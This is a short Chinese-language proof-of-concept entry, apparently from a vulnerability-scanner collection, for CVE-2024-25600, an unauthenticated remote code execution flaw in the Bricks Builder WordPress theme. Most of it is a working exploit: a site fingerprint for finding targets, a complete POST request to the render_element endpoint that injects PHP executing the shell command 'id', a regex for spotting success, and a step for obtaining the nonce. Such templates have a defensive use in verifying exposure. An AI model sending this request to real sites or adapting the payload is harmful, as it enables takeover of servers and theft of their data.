﻿# WordPress插件Bricks Builder存在RCE漏洞

> 更新时间：2024-03-15

> 漏洞编号：CVE-2024-25600

> 漏洞说明：Bricks Builder 版本 <= 1.9.6 中未经身份验证的 RCE 漏洞允许攻击者在目标服务器上执行任意命令。可能会导致受影响的 WordPress 站点完全受到攻击，从而导致未经授权的访问、数据盗窃以及进一步利用服务器进行恶意目的。由于该漏洞可以被未经身份验证的用户利用，因此攻击面明显更广，使大量网站面临潜在的利用风险。

> 漏洞特征：body="/wp-content/themes/bricks/"

> 验证脚本：HTTP

```
POST /wp-json/bricks/v1/render_element HTTP/1.1
Connection: close
Content-Type: application/json
Accept-Encoding: gzip

{
  "postId": "1",
  "nonce": "b5b275220f",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
        "objectType": "post"
      }
    }
  }
}
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?uid)(?=.*?Exception).*?$

> 上传文件定位：

> 验证文件来源：WordPress插件Bricks Builder存在RCE漏洞.poc

```
备注说明：
获取网站的nonce值
GET / HTTP/1.1
Connection: close
Accept-Encoding: gzip
```